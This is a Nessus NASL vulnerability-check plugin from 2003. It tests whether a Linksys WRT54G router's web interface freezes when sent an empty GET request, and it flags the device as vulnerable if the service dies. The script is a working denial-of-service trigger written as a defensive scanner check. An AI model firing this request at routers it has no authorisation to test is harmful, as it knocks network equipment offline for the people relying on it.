#
# This script was written by Michel Arboi <arboi@alussinan.org>
#
# GNU Public Licence (GPLv2)
# 
# References:
# http://www.zone-h.org/en/advisories/read/id=3523/
#
# I wonder if this script is usefull: the router is probably already dead.
# 

if(description)
{
 script_id(11941);
 script_version ("$Revision: 1.3 $");
 
 name["english"] = "Linksys WRT54G DoS";
 script_name(english:name["english"]);
 
 desc["english"] = "
It is possible to freeze the remote web server by
sending an empty GET request. 
This is know to affect Linksys WRT54G routers.
 
Solution : Upgrade your firmware.

Risk factor : High";

 script_description(english:desc["english"]);
 summary["english"] = "Empty GET request freezes Linksys WRT54G HTTP interface";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 Michel Arboi");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
include("http_func.inc");

port = get_http_port(default:80);

if(! get_port_state(port)) exit(0);

if (http_is_dead(port: port)) exit(0);

soc = http_open_socket(port);
if ( ! port ) exit(0);

req = 'GET\r\n';
send(socket:soc, data: req);
http_recv(socket: soc);
http_close_socket(soc);

if (http_is_dead(port: port)) security_hole(port);
